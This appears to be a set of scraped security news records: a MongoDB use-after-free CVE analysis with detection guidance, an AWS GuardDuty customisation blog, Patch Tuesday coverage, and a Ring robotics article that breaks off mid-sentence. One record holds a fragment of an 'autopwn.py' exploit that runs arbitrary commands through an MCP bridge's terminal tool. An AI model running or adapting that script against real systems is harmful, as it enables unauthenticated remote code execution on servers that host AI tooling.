articles.title: CVE-2026-118383: Use-after-free vulnerability in MongoDB
articles.context: Remote unauthenticated exploitation is possible, but only during a specific window that the attacker does not have visibility into
articles.full_text:
Key points and observations

CVE-2026-118383 is a critical use-after-free in MongoDB Server's primary catch-up process, with a CVSS v4.0 score of 9.5. It affects replica set members, including those used by shards and config servers. Standalone mongod instances are unaffected.

Remote unauthenticated exploitation is possible, but only during a specific window that the attacker does not have visibility into.

We reproduced a crash (segmentation fault) on MongoDB Server 8.0.34.

An unauthenticated client can set up the crash with two ping requests, because vulnerable servers accept ping before login. Turning on authentication does not prevent this.

Upgrade every affected replica set member to a fixed release. Restricting network access can reduce exposure while you upgrade.

What happened

MongoDB announced a security update on November 10. The company said it found the vulnerability internally and was not aware of exploitation attempts at the time of its announcement. The advisory describes a use-after-free when a newly elected replica set primary completes catch-up. During catch-up, the member applies operations it missed before accepting writes as primary.

The vulnerability affects ordinary replica set members. It also affects the replica set members used by shards and config servers in sharded clusters. A standalone mongod does not perform replica set primary catch-up and is not affected by this vulnerability. The advisory rates the issue Critical and says the server may terminate unexpectedly or, under certain conditions, execute arbitrary code in the server process.

How to know if you are affected

The issue affects replica set members, including shard and config server replica set members in sharded clusters. Standalone mongod instances are not affected.

The MongoDB fix releases are:

MongoDB Server branch

First fixed release

9.0

9.0.7

8.3

8.3.16

8.0

8.0.37

7.0

7.0.48

6.0

6.0.30

5.0

5.0.35

4.4

4.4.32

Upgrade to the fixed release for your branch, or use a distributor package that includes the fix. Verify the version running on every member after the upgrade, including members in containers and any members that were offline during maintenance. MongoDB says Atlas clusters are upgraded automatically during maintenance. It urges customers who defer maintenance to apply the upgrade promptly.

Until you can upgrade, restrict network access to MongoDB to the specific systems that need access to it. This limits who can send the unauthenticated requests, but it does not fix the use-after-free.

Exploitation window and likelihood

When a replica set member wins an election, it first catches up on writes it missed, then starts accepting new ones. The bug is in the cleanup at the end of that catch-up step. Before any election happens, an attacker can leave two stale “waiters” on a member. A waiter is a pending notification MongoDB creates when a request asks to wait until replication reaches a certain point. Planting them does not crash the server by itself. The diagram below traces an election timeline and marks where the crash fires.

Plant during steady state: The attacker sends two unauthenticated ping requests that include a readConcern.afterOpTime value to a reachable, vulnerable replica set member. The waiters don't expire. They stay in place until the member restarts, rolls back, or steps down from primary.

Reach catch-up: Later, the same member has to win an election while it is behind another member. The attacker can't cause the lag or the election. Both have to happen on their own, for example during maintenance or an outage.

Crash when catch-up ends: When catch-up finishes, the new primary runs its cleanup twice, uses memory it has already freed, and crashes before it accepts any writes. Once the first two steps are in place, the crash does not depend on winning a timing race.

We created the lag and the failover ourselves, so the roughly 40 seconds our lab run took is not an estimate of how quickly a real attack would work. After the crash, our test cluster had no primary. Another deployment might elect a new primary and keep running.

What we reproduced

We built a four-member replica set from MongoDB's official Linux x86_64 binaries and created the two conditions an attacker can't control: one member falling behind on replication, and a failover that makes that member the new primary. Setting this up took admin access to the lab, to pause and stop mongod processes and to write data with an authenticated client. The attacker's part, the two ping requests, used no credentials, and we confirmed that the same unauthenticated client could not write to the database.

We ran the same failover three times, changing only the MongoDB version and whether we sent the two requests:

Run

Server

Unauthenticated waiter requests

Observed result

A

8.0.34

Both timed out after about 1.5 seconds with MaxTimeMSExpired

The target member exited catch-up twice, logged SIGSEGV, and the mongod process crashed

B

8.0.34

None sent

The target member exited catch-up once, became writable, and remained running through the observation window

C

8.0.37

Both rejected immediately with Unauthorized

The target member exited catch-up once, became writable, and remained running through the observation window

The video below shows run A from start to finish: the two unauthenticated requests, the failover we triggered, and the new primary crashing.

Your browser does not support the video tag.

In run A, MongoDB's log shows the new primary leaving catch-up mode twice within the same millisecond, followed by “Invalid access at address: 0” and “Got signal: 11 (Segmentation fault).” The backtrace points to CatchupState::abort_inlock(). Runs B and C went through the same failover, logged a single catch-up exit, and kept running.

Run C shows that the patched server refuses the requests. It does not test the other half of MongoDB's fix, which stops the double cleanup even when waiters are already in place; MongoDB's own regression tests cover that case. Our results show that the crash can be set up without credentials in this lab setup. They don't tell us how often it would succeed in other topologies, and we did not achieve code execution.

How to detect exploitation attempts

Start with MongoDB's structured server logs. In our vulnerable run, each planted request appeared as a COMMAND “Slow query” event (ID 51803). The useful fields were:

attr.command.ping

attr.command.readConcern.afterOpTime

attr.command.maxTimeMS

attr.errName (MaxTimeMSExpired)

attr.durationMillis

attr.remote

Look for an unauthenticated command with unusual operation-time values and an expired wait.

Also check the logs for the sequence that preceded a crash: a member enters primary catch-up (ID 21359), exits catch-up twice (ID 21363) in one transition, and then logs a fatal signal or backtrace involving CatchupState::abort_inlock(). A normal election or a single catch-up exit does not identify this CVE. The requests may arrive before the failover. Review earlier logs from the same member, not just events around the crash.

Whether these request fields appear in the logs depends on your logging settings. MongoDB documents that client operations enter the diagnostic log when they exceed the slow-operation threshold or when command verbosity is at least one. Check whether your logs retain the command object. Slow-operation sampling or a log pipeline may drop it. The attr.remote field may contain a loopback address rather than the original client IP.

How Datadog can help

Datadog Cloud Security Management reports findings for CVE-2026-118383. Check the vulnerability findings for affected hosts and container images.

Datadog Cloud Security Management also flags security groups that allow inbound MongoDB access from the internet, through the rule Inbound MongoDB access should be restricted. Use it to find exposed replica set members to patch first. Datadog Cloud SIEM detections for CVE-2026-118383 are currently being evaluated, and we will update this post when they are available.

Conclusion

CVE-2026-118383 affects MongoDB replica set members when a newly elected primary finishes catch-up. We reproduced a crash after two unauthenticated requests left abandoned waiters. The patched release rejected those requests. The vendor also identifies arbitrary code execution as a possible impact under certain conditions; our tests did not demonstrate it. Upgrade every affected member to a fixed release, verify the running versions, and investigate unusual readConcern.afterOpTime requests alongside catch-up and crash events.

articles.full_text: #!/usr/bin/env python3 # ============================================================================= # autopwn.py # (RufRoot): Unauthenticated RCE in the Ruflo MCP Bridge # ============================================================================= # Usage: python3 autopwn.py <target_ip> # Example: python3 autopwn.py 192.168.x.x # ============================================================================= import sys import json import socket import subprocess import tempfile import os import time import base64 import urllib.request import urllib.error # --------------------------------------------------------------------------- # Helpers # --------------------------------------------------------------------------- def mcp_call(target, endpoint, method, params=None): """Send a JSON-RPC 2.0 request to the MCP bridge.""" url = f"http://{target}:{MCP_PORT}{endpoint}" payload = json.dumps({ "jsonrpc": "2.0", "id": 1, "method": method, "params": params or {} }).encode() req = urllib.request.Request( url, data=payload, headers={ "Content-Type": "application/json", "Accept": "application/json, text/event-stream", }, method="POST" ) try: with urllib.request.urlopen(req, timeout=TIMEOUT) as resp: return json.loads(resp.read().decode()) except urllib.error.URLError as e: fail(f"Request to {url} failed: {e}") def rce(target, command): """Execute a command via ruflo__terminal_execute.""" resp = mcp_call(target, "/mcp/devtools", "tools/call", { "name": "ruflo__terminal_execute", "arguments": {"command": command} }) try: # The bridge returns JSON inside a text field inside JSON # Outer: resp["result"]["content"][0]["text"] -> JSON string # Inner: that JSON string has another "content" array outer_text = resp["result"]["content"][0]["text"] middle = json.loads(outer_text) # middle is {"content": [{"type": "text", "text": "{...}"}]} inner_text = middle["content"][0]["text"] inner = json.loads(inner_text) return inner.get("output", "").strip() except Exception: # Fallback: return whatever we got as string return str(resp) def get_local_ip(): """Get the local IP that can reach the target.""" s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) try: s.connect(("8.8.8.8", 80)) return s.getsockname()[0] finally: s.close() # --------------------------------------------------------------------------- # Banner # --------------------------------------------------------------------------- def banner(): print(f"{BLUE}") print(" ==================================================") print(" autopwn - CVE-2026-59726 (RufRoot)") print(" Unauthenticated RCE in the Ruflo MCP Bridge") print(" ==================================================") print(f"{NC}") print() # articles.title: Reduce alert fatigue by customizing threat detection features in Amazon GuardDuty
articles.context: Over the past year, AWS has released a set of capabilities within GuardDuty that you can use to supply that missing context, most recently with the launch of Custom Detection Rules
articles.full_text:
The teams responsible for security today don’t have a problem with the number of alerts they receive; they have a problem turning those alerts into something truly actionable. When an analyst concludes an investigation with “this was caused by our vulnerability scanner” or “this account is configured to share Amazon Machine Images (AMIs) publicly on purpose,” the detection worked as designed, it just wasn’t applicable to the environment. When this happens continuously at scale, alert fatigue sets in. As teams sort through these events, incident response slows down or, worse, teams stop paying attention to the alerts at all.

Amazon GuardDuty is a threat detection service that continuously monitors, analyzes, and processes Amazon Web Services (AWS) data sources and logs in your AWS environment for suspicious or potentially malicious activity. GuardDuty then delivers detailed security findings to you for visibility and remediation. GuardDuty accomplishes this by analyzing independent streams of available sources. This includes logging of management events in AWS CloudTrail, information about IP traffic through Amazon Virtual Private Cloud (Amazon VPC) Flow Logs, and Amazon Route 53 DNS query logs to name a few. These sources don’t need to be enabled or configured within your accounts for GuardDuty to use them. When GuardDuty observes activity that looks suspicious or anomalous, it produces a finding that’s a detailed security alert naming the behavior, the resources involved, and any supporting evidence. A finding is a signal to investigate, not a final verdict.

While the managed detections in GuardDuty work consistently across every AWS customer, personalizing detections for your specific architectures and environments is equally important. Over the past year, AWS has released a set of capabilities within GuardDuty that you can use to supply that missing context, most recently with the launch of Custom Detection Rules.

In this post, we walk through those capabilities in three distinct stages. These stages explore how to customize what GuardDuty detects, triage the findings that remain, and accelerate investigations. Throughout this blog post you’ll learn how to:

Efficiently detect anomalous behavior that shouldn’t occur in a specific account, without building detection logic yourself

Measure if a detection will be noisy before it generates a single finding, flooding security teams

Feed your own custom threat intelligence, including file hashes, into GuardDuty

Scope a suppression rule narrowly enough to archive expected activity while surfacing the same behavior elsewhere

Get an automated analysis of a finding, with a risk level and recommended actions, before the finding is opened manually

Prerequisites

For the walkthrough in this post, you must have the following prerequisites in place.

GuardDuty must be enabled in at least one AWS account and AWS Region. Note that these customization features aren’t currently available in all Regions, for more information, see Region-specific feature availability.

Your user or role must have AWS Identity and Access Management (IAM) permissions to configure these features in GuardDuty. The AmazonGuardDutyFullAccess_v2 managed policy covers the required actions.

If you manage multiple accounts through AWS Organizations, AWS recommends administering GuardDuty using the delegated administrator account. By using this method, you can manage lists, suppression rules, and conduct investigations from a centralized location.

GuardDuty Runtime Monitoring must be enabled to conduct file hash matching and to use Custom Detection Rules for Runtime Monitoring. This protection plan isn’t enabled automatically in GuardDuty.

An Amazon Simple Storage Service (Amazon S3) bucket that you control for storage of custom threat entity lists.

The AWS Command Line Interface (AWS CLI) installed.

Stage 1: How to customize what GuardDuty detects

An AMI is a pre-configured template that contains the software configurations needed to launch an Amazon Elastic Compute Cloud (Amazon EC2) instance on AWS. Sharing an AMI publicly can be a routine operation in an account whose purpose is distributing images, and a potential security event in any other account. The same might be said for disabling VPC Flow Logs, or signing in without multi-factor authentication for a legacy service account. Until the release of Custom Detection Rules, there was no way to account for these differences in GuardDuty.

Custom Detection Rules

Custom Detection Rules is a library of prebuilt, opt-in rules that AWS builds and maintains. At launch, it holds 90 rules across AWS CloudTrail management events and GuardDuty Runtime Monitoring events, producing 38 finding types mapped to 13 MITRE ATT&CK® tactics, described using vocabulary from ATT&CK and the Threat Technique Catalog for AWS. The catalog is maintained by the AWS Customer Incident Response Team (CIRT) and is based on the MITRE ATT&CK Cloud Matrix, documenting threat actor tactics, techniques, and procedures specific to AWS as observed by the AWS CIRT during customer engagements. Each entry includes detection guidance and mitigations specific to AWS environments, so a technique ID on a finding points to a public entry that your team can read.

Previously, detecting environment-specific behavior meant ingesting your own CloudTrail logs or host telemetry, normalizing them, building the logic, and maintaining that logic as APIs changed. Custom Detection Rules remove that work. You select the rules for GuardDuty to evaluate against the CloudTrail management events it already analyzes and, where Runtime Monitoring is enabled, the runtime events from the GuardDuty security agent, without the undifferentiated heavy lifting of log ingestion, normalization, and storage. Coverage is extended without adding unnecessary alerts that don’t add value to your teams.

Each rule runs in one of two modes. In dry run mode, GuardDuty evaluates the rule and publishes Amazon CloudWatch metrics showing how often an event matched the rule, but generates no findings. Dry run mode expires automatically after 14 days. In live mode, events that match generate findings, and live mode has no expiration.

Custom Detection Rules are currently available in all AWS commercial Regions and the AWS GovCloud (US) Regions. Custom Detection Rules for Runtime Monitoring are available in every region where GuardDuty Runtime Monitoring is available.

Walkthrough: Measure a rule, then turn it on

Start in dry run so you can measure the noise level before receiving a finding. This walkthrough uses the AMIExternalAccess rule, which detects when an AMI is shared with an external AWS account or made public, and applies it from the GuardDuty delegated administrator account. In an organization, the delegated administrator manages Custom Detection Rules for all member accounts through an organization configuration, and accounts that join the organization later inherit it.

Using the GuardDuty console

Open the AWS Management Console for GuardDuty and choose Custom Detection Rules.

Figure 1. The Custom Detection Rules catalog with the detection logic for the AMIExternalAccess rule

Select a rule name to see its detection logic on the Details tab. Rules are SQL conditions over CloudTrail fields, so you can review exactly what a rule matches before enabling it.

Choose the rule’s Accounts tab, then under Organization configuration, choose Configure.

Figure 2. Configuring the AMIExternalAccess rule in dry run mode

Under Configuration strategy, select Whole organization. Under Status, select Dry run. Under Accounts, select Apply rule status to all accounts, then choose Save.

Watch the CustomRuleDryRunSignalsMatched metric in CloudWatch. GuardDuty publishes the metric only when the rule matches an event, so a rule with no matching activity shows no data. Because dry run mode expires automatically after 14 days, a full dry-run period is the longest continuous sample GuardDuty collects without you re-enabling the rule. The metric data persists in CloudWatch under its standard retention after the dry run ends, so you can review it shortly before or after expiry and still base your decision on the most complete data available. Volume alone doesn’t tell you whether the activity is benign, so account for what you see before deciding. If a rule matches constantly and someone can point to the process that causes it, that account is a poor candidate for live mode. If nobody can explain the matches, investigate them as they stand, because a dry run measuring real attacker activity looks the same as one measuring routine operations.

Figure 3. Dry-run match volume for a rule over one week, shown as hourly totals

When you’re satisfied the rule is worth acting on, return to the rule’s organization configuration and change Status to Live to start generating findings. To keep the rule off in accounts where the activity is expected, such as an image-build account, choose Exclude accounts manually under Accounts and select those accounts.

Using the AWS CLI

From the delegated administrator account, apply the rule in dry run to the whole organization. Omitting account lists targets every member account, including accounts that join later.

aws guardduty create-custom-detection-rule-org-configuration \ --rule-id ami-external-access \ --mode DRY_RUN

Review the CustomRuleDryRunSignalsMatched metric over the dry-run period, applying the same judgment described in the preceding console procedure.

Move the rule to live mode by updating the existing configuration. Creating a second whole-organization configuration for the same rule fails with a conflict error. To exclude accounts where the activity is expected, add --exclude-account-ids.

aws guardduty update-custom-detection-rule-org-configuration \ --rule-id ami-external-access \ --mode LIVE \ --exclude-account-ids <image-build-account-id>

Note: In a standalone account that isn’t part of an organization, you enable a rule for that account alone. With the AWS CLI, use create-custom-detection-rule-association with the same --rule-id and --mode parameters. To change the mode later, use update-custom-detection-rule-association with the association ID. Member accounts in an organization can’t enable or change a rule themselves; the delegated administrator manages rules on their behalf. For details, see Managing Custom Detection Rules in multiple-account environments.

Threat entity lists

If your threat intelligence team already tracks known-bad infrastructure and files, you can pass those indicators to GuardDuty and generate findings when they appear in your AWS account.

GuardDuty has two list formats. An IP address list holds IP addresses only. An entity list, the newer format, can hold IP addresses, CIDR ranges, and domain names together in a single file. The difference that matters is coverage: entity list entries apply to CloudTrail, VPC Flow Logs, and Amazon Route 53 Resolver DNS query log findings, while IP address lists cover CloudTrail and VPC Flow Log findings only. If you still use IP address lists, the additional DNS coverage is a reason to move.

In addition, entity lists now also accept SHA-256 file hashes. Hashes sit alongside network indicators in the same file, and GuardDuty checks them against Runtime Monitoring. When the runtime agent sees an executable whose hash matches an active list, it generates a high severity Execution:Runtime/MaliciousFileExecuted.Custom finding and names the matching list, so your responder knows which intelligence source was used.

Note: If the entity list is changed, the list must be reactivated to include the updates. Uploading a new version of the file isn’t sufficient on its own. If this step is automated, build that reactivation step into the same process that refreshes the file.

Entity lists are currently available in all AWS commercial Regions, but not in the AWS GovCloud (US) Regions.

Stage 2: How to triage the findings that remain

Customizing detection reduces findings at the source, but the work is rarely finished there. New workloads appear, teams change how they operate, and some findings still describe activity that’s expected in your environment. You also need a precise way to route those events away from the queue your analysts work from.

A filter selects findings. A suppression rule is a filter that automatically archives a GuardDuty finding it matches. Archiving isn’t deletion: the finding is retained for 90 days and stays viewable, but the finding isn’t forwarded to AWS Security Hub, Amazon S3, Amazon Detective, or Amazon EventBridge, so it stays out of your security information and event management (SIEM) system and ticket queue.

Two changes have made that routing more customizable.

Wildcards

Filter criteria now support the Matches and NotMatches operators, where * matches any number of characters and ? matches one. Criteria used to be exact-match only, so suppressing findings from every AWS Lambda function in a service meant listing each name and updating it on every deployment. One pattern now covers the naming convention, including functions that don’t exist yet, so the rule stops going stale.

Additional property filter fields

You can now use over 1,000 supported fields from a finding as suppression criteria, including runtime process details, Kubernetes workload metadata, network connection information, and attack sequence signals. Take a vulnerability scanner in one Kubernetes namespace generating expected findings. With no namespace criterion available, you previously either suppressed the finding type more broadly than you wanted or wrote downstream logic to strip them. Now you scope the rule to that specific namespace and leave detection intact everywhere else in the cluster. This expanded field set is available in the aws partition; other partitions continue to use the console-supported fields only. See Filtering findings in GuardDuty for the full list of supported fields.

The recommended method is to assemble your criteria on the Findings page first, confirm the filtered list contains only findings you’re willing to archive, then choose Create suppression rule. The console and CLI procedures are detailed in the user guide.

Figure 4. Findings filtered by finding type and Kubernetes namespace, before creating a suppression rule

Before you write wildcard criteria, know that they can’t be validated with ListFindings or GetFindingsStatistics, the testing workflow AWS recommends for ordinary filters. Instead, start from a filter that takes no action and watch the suppression rule metrics to see how much it would match before you rely on it. Nothing is lost if the pattern is too broad, matched findings are archived rather than deleted, so you can lift the suppression rule and return them to your queue.

Stage 3: How to accelerate investigations

What remains consumes analyst hours. To decide whether a finding is a real event, an analyst pivots into CloudTrail for the operations that identity performed, lines up timestamps, checks IPs and domains against intelligence, and looks for a change ticket that explains the work. That can take hours, and most such investigations end in expected. When one doesn’t, all that time was spent before any actual containment could begin.

GuardDuty Investigation, also called AI-powered investigations performs that correlation automatically. GuardDuty Investigation analyzes the finding alongside related activity from the past 90 days, affected resources, threat intelligence, and threat indicators, and returns a structured summary in minutes: a risk level, a confidence rating, a written summary, supporting detail, MITRE ATT&CK classification, and recommended actions including the CLI commands to carry them out.

Note: Read the confidence rating as carefully as the risk level. High risk with low confidence is a very different indicator to an analyst than high risk with high confidence.

You can investigate a single finding, an account, or a whole organization, from the console, the AWS CLI, the API, or an AWS MCP Server. To turn on AI-powered investigations, go to Settings, find AI powered investigations – Preview, and choose Enable.

Figure 5. A completed account investigation with risk level, confidence, analysis summary, and recommended actions

The preview runs in 10 AWS Regions: US East (N. Virginia), US East (Ohio), US West (Oregon), Canada (Central), Europe (Frankfurt), Europe (Ireland), Europe (London), Europe (Paris), Europe (Stockholm), and Asia Pacific (Tokyo). It allows 10 investigations per account per day and 100 per account in total, and can only be started from an administrator account, member accounts can’t create investigations from their own accounts. The feature uses Amazon Bedrock models with Cross-Region Inference (CRIS), which automatically selects a Region within your geography to process the analysis and generate the report. Your data remains stored only in the Region where the investigation request originates, but investigation data and summary results might be processed outside that Region. Review that routing if you have data residency commitments. For GuardDuty Region-specific differences more broadly, see Region-specific feature availability in the user guide.

Putting it all together

Consider a team running containerized workloads on Amazon Elastic Kubernetes Service (Amazon EKS) across a handful of accounts in one organization.

The threat intelligence team uploads SHA-256 hashes from a recent brief as a threat entity list. Security engineering enables Custom Detection Rules in dry run mode and finds after 2 weeks that AMI sharing fires constantly in the image-build account and nowhere else, so they promote the rule to live across the organization and exclude the build account.

The team’s vulnerability scanner runs in a dedicated Kubernetes namespace, so they suppress that namespace and finding type while leaving the same behavior detected elsewhere. A second rule uses a wildcard on their Lambda naming convention, replacing a hand-maintained list.

Suppressed findings are archived instead of being sent to Security Hub, Amazon S3, EventBridge, or the SIEM, so they never reach the analyst queue. When a finding does warrant attention, an analyst starts an investigation and gets a disposition before manual work begins.

Each stage reduces the work of the next. Customizing detection means less to triage, effective triage means less to investigate, and automated investigation means the findings that reach a human get a decision faster.

Next steps

If you haven’t enabled GuardDuty, start with the 30-day free trial. Most protection plans enable automatically and are included, so you can evaluate them. Turn on Runtime Monitoring separately if you want to test hash matching or Custom Detection Rules for Runtime Monitoring..

If you’re already using GuardDuty:

Enable two or three Custom Detection Rules in dry run mode. Choose behavior that shouldn’t occur in specific accounts, measure across the dry-run period, then promote selectively.

Revisit existing suppression rules. Any rule written before the April 2026 field expansion might be broader than you intended, because the field you wanted wasn’t available then; narrow it to that field now.

Audit filters for wildcard opportunities. Any filter with a growing list of exact-match names is maintenance a single pattern can replace.

Migrate IP address lists to entity lists for the DNS query log coverage.

Conclusion

GuardDuty’s managed detections keep expanding, driven by AWS threat intelligence, security research, and customer feedback. These capabilities enable you to decide which activity is worth alerting on in which accounts, and which findings never need to be delivered to a human at all.

articles.title: November Patch Tuesday boasts over 1,000 bugs, one already under attack
articles.context: It’s another doozy of a Patch Tuesday, with Microsoft fixing 1,094 bugs in its products, including one that attackers exploited before Redmond released a patch
articles.full_text: It’s another doozy of a Patch Tuesday, with Microsoft fixing 1,094 bugs in its products, including one that attackers exploited before Redmond released a patch. Jake Knott, head of threat intelligence at exposure management firm watchTowr, succinctly said in an email to The Register: “Maybe we should just go home.” “Most security teams haven’t quite recovered from the last month of bumper-to-bumper critical vulnerabilities, emergency patches, and ‘2shell’-branded everything, and we’re yet again at another Patch Tuesday,” Knott told us. Starting with the zero-day: It’s an Outlook spoofing vulnerability, tracked as CVE-2026-124194, and it only garnered a 6.5 out of 10 CVSS rating. But as Dustin Childs, head of threat awareness at TrendAI’s Zero Day Initiative, warns, don’t let the score or the name lull you into thinking it’s OK to put off patching this one. “It’s labeled spoofing, but the impact is bigger than the name suggests,” Childs said in his monthly Patch Tuesday review. “An attacker sends a specially crafted message file and convinces a user to open it,” he wrote. “Outlook then connects to an attacker-controlled network location without showing the usual external-content warning, which discloses the user’s NTLMv2 hash. The attacker can use that hash to authenticate as the user.” Microsoft marked CVE-2026-124194 as exploited, but per usual didn’t say when the attacks started, who is battering this bug, and what they are doing with the access post exploitation. These details will likely start trickling out soon. Plus, now that there’s a public fix, other miscreants are undoubtedly already scanning for vulnerable versions and reverse engineering the patch for their own attack purposes. So prioritize this fix, and keep an eye on your inbox for any suspicious files. Back-to-back months of 1K+ CVEs Despite the second month of more than 1,000 CVEs (October had 1,474), CVE-2026-124194 is the only one under active exploitation, and none of the 1,094 are listed as publicly known. Childs says this shouldn’t give organizations “false comfort.” “Logging back-to-back months above 1,000 CVEs proves automated bug-hunting has permanently reset patch volume,” he told The Register. “With AI making patch-diffing and exploit generation near-instant, the threat window opens the minute these updates drop.” For defenders, this means two things, Childs added. “What defenders need to know and do right now is abandon broad triage and take immediate defensive action: patch Exchange and Domain Controllers (LDAP/Kerberos) first to stop zero-click compromise, ring-fence exposed network services like DNS and DHCP to prevent wormable spread, and verify manual administrative fixes on your cloud services,” he said. Zero-click threats There are two zero-click threats in this month’s batch of fixes: CVE-2026-116928 and CVE-2026-119958. Both are critical, carrying 9.8 CVSS ratings, in part because they don’t require any user interaction to exploit. CVE-2026-116928 is an out-of-bounds write in Microsoft Windows Search Component that could lead to remote code execution. An unauthenticated attacker could abuse this search feature in Exchange “by sending an email containing a specially crafted attachment,” Redmond warned. “Exchange automatically processes the attachment for indexing, so the recipient does not need to open the email or attachment. Successful exploitation could allow the attacker to execute code with the permissions of the affected processing service.” CVE-2026-119958 is an out-of-bounds write vulnerability in Windows' implementation of the Lightweight Directory Access Protocol (LDAP) that could allow unauthenticated attackers to execute code remotely without user interaction. This one can be exploited by sending specially crafted LDAP requests to vulnerable systems, potentially compromising domain controllers. Childs also counts 30 CVEs that pose a “wormable risk,” requiring zero authentication and zero user interaction over a network. All of those are listed in his blog, so prioritize fixing those as well. And…Xbox remote code execution And finally, for funsies, a critical flaw in the Windows Xbox Live Networking Service, CVE-2026-112967, that could allow remote code execution also made this month's roundup. It's a heap-overflow vulnerability with a 9.8 CVSS rating that doesn't require authentication or user interaction to exploit. So don't take a gaming break between testing November's updates. Or, if you do, at least make sure vulnerable Windows systems running the Xbox Live Networking Service are on your patching list, too. ®

articles.title: November Patch Tuesday: An Overflowing Cornucopia of CVEs
Microsoft Fixes Nearly 1,100 Security Vulnerabilities
articles.context: This month’s Patch Tuesday addresses 63 critical flaws — including a zero-day in Microsoft Outlook — and comes amid important security updates from other software makers,...
articles.full_text:
Microsoft did another four-digit patch drop today, releasing updates to fix almost 1,100 security vulnerabilities in its Windows operating systems and supported software. This month’s Patch Tuesday addresses 63 critical flaws — including a zero-day in Microsoft Outlook — and comes amid important security updates from other software makers, including Adobe, Apple, Google and Mozilla.

Image: Shutterstock.com. Diorama by @zepp1969.

November’s patch release from Redmond tackles 1,093 vulnerabilities, fixing 63 “critical” flaws that can be exploited to seize control over a Windows system with little or no help from users. Nearly half of those critical bugs are remote code execution vulnerabilities. Overall, 535 of the flaws addressed this month allow an attacker to elevate their privileges on a vulnerable device.

This latest round of updates means Microsoft has shipped more than 5,100 security patches so far this year, a staggering number considering that a year ago Microsoft was averaging around 100 patches per month. Microsoft credits advances in artificial intelligence for helping to find (and fix) such a large volume of security bugs in recent months. Last month, Microsoft pushed more than 1,400 fixes.

According to Redmond, just one of the flaws is already seeing active exploitation: CVE-2026-124194, a spoofing bug in Outlook. The advisory for CVE-2026-124194 says it affects Microsoft 365 Apps for Enterprise and editions of Microsoft Office.

Several other major software makers pushed security updates this week to fix critical weaknesses in their products. Apple on Monday released out-of-cycle security updates to fix at least nine vulnerabilities in iOS/iPadOS, macOS, watchOS and visionOS. Among the weaknesses reportedly fixed in Apple’s release include an iMessage flaw that could let a remote attacker join a group chat and receive its messages; the updates also fix a separate iMessage flaw that could let someone added to a group access messages sent before they joined.

Lee Neely, an instructor at the SANS Institute, noted that Apple backported the fix to iOS 18.

“I take notice when Apple releases fixes to more than two versions,” Neely wrote in a SANS newsletter today. “You really need to get to version 27.2.1 of their OSes and push folks who are holding onto devices which cannot run the current version. The best plan often involves setting an upgrade date for old hardware. Run through all your Apple devices and make sure everything is up to date, don’t assume the fixes went out automatically.”

Google this week released Chrome version 157.0.8103.50, which resolves nine security holes, including CVE-2026-125350, the sixth zero-day vulnerability this year for Chrome (this bug also being patched in Chromium-based browsers like Edge). The latest Chrome version follows its November 3 release, which fixed 213 vulnerabilities. A new version of Mozilla Firefox out today (Firefox 160) resolves almost 100 CVEs, about half of them high severity.

Adobe today released patches for at least 110 vulnerabilities across a range of products, with nearly half of the flaws rated high severity. Adobe said there is no evidence any of the security holes it addressed this month are being actively exploited.

Chris Goettl, vice president of product management at Ivanti, said it’s easy for security teams at large enterprises to feel overwhelmed by the volume and criticality of patches from Microsoft lately. But he notes that while some 95,000 vulnerabilities have been assigned CVEs this year across all vendors, only 217 have so far this year been added to the Known Exploited Vulnerabilities (KEV) list maintained by the U.S. Cybersecurity and Infrastructure Security Agency (CISA).

“Roughly four in ten of this year’s exploited vulnerabilities sit in operating systems, endpoint software, browsers, and server platforms, which a continuous patch strategy can close quickly,” Goettl said.”The rest calls for exposure management alongside patching, especially the 44% that sit in edge devices and IT management or remote access tools, the internet-facing systems that hold privileged access. Teams that can quickly identify those assets, confirm exposure and act on confirmed exploitation can focus on the small slice of vulnerabilities attackers are actively using, while the rest stays on the normal patch cadence.”

Please don’t neglect to back up any important data if you haven’t recently; generally speaking, this is a task best accomplished before applying operating system updates. As ever, if you experience any issues applying this month’s bundle of love from Microsoft, please drop a comment about it in the space below.

articles.title: Ring robots ready to patrol paranoids’ pads
articles.context: The house of Bezos announced the launch of Ring Robotics on Tuesday along with its first two products: a drone designed for indoor home security, and a wheeled robot with a...
articles.full_text: If you didn't have any privacy concerns about slapping a Ring doorbell on your front door or putting Ring cameras inside, you'll love Amazon's newest offerings, which move around homes and businesses to capture views stationary cameras might miss. The house of Bezos announced the launch of Ring Robotics on Tuesday along with its first two products: a drone designed for indoor home security, and a wheeled robot with a telescoping camera mast for automated after-hours business patrols. Both are designed to proactively patrol spaces as well as respond to alerts from connected alarm systems and Ring-connected devices. According to Ring founder Jamie Siminoff, this is something customers actually want, as those stationary cameras just can’t quite see everywhere. “It’s not just a new category of security; it’s the beginning of a future where proactive, autonomous protection is something every home and every business can have,” Siminoff said. The consumer-focused Ring Drone Cam launches from its own charging dock that Amazon says keeps the thing “out of sight” when not in use, and when in flight is able to patrol a home by flying around pre-programmed routes to take in the sights with its 148-degree FOV, 2K camera that includes LED illumination for night patrols. Amazon says it can also respond to alerts from cameras, sensors, and alarm systems. The Ring Rover Cam, designed with businesses in mind, is sort of like a security Roomba that sports a camera on a telescoping mast that Amazon says can be programmed to certain heights to let it see over counters, shelves, and other workplace obstacles. The Rover can also perform 360-degree scans and includes a siren, lights, and two-way audio so you can yell at intruders who aren't dissuaded by its presence. The Rover streams and records video in up to 4K while moving or patrolling and is designed to make regular patrols of businesses during off hours. It can also detect people and respond to alerts from connected Ring devices. Of course, given that this is Ring we're talking about, these flying and free-wheeling cameras use Amazon's cloud for some processing, likely inviting privacy concerns about what footage and mapping data the company can access and retain. The Amazon-owned security tech firm has faced a number of privacy complaints over the years, some of which have resulted in multimillion-dollar settlements. Ring agreed to pay $5.8 million in a 2023 settlement with the FTC over allegations that employees and contractors improperly accessed customers' private videos and that the company failed to adequately protect accounts against unauthorized access – just imagine the privacy concerns raised by flying robots. More recently, the company took heat for partnering with surveillance outfit Flock Safety, a relationship which it has since canceled. Amazon/Ring also invited criticism for a Super Bowl ad earlier this year promoting a new feature called Search Party, which would remotely activate Ring cameras to search for lost pets, suggesting that Amazon had the ability, in theory, to use Ring cameras like a dystopian neighborhood surveillance network. Another Ring feature, Familiar Faces, which uses AI-powered facial recognition to identify people captured by compatible cameras, prompted a proposed class-action lawsuit filed in June. The complaint alleges that the feature collected biometric information from visitors and passersby without their consent. If we can’t have iRobot, we’ll do it with Ring Amazon abandoned its efforts to buy Roomba robot-vacuum maker iRobot in 2024, blaming regulatory scrutiny for the move. The FTC, under then-chair Lina Khan, examined the deal's potential effects on competition and consumer privacy, including concerns about the information Roombas collect while mapping customers' homes. European regulators, meanwhile, 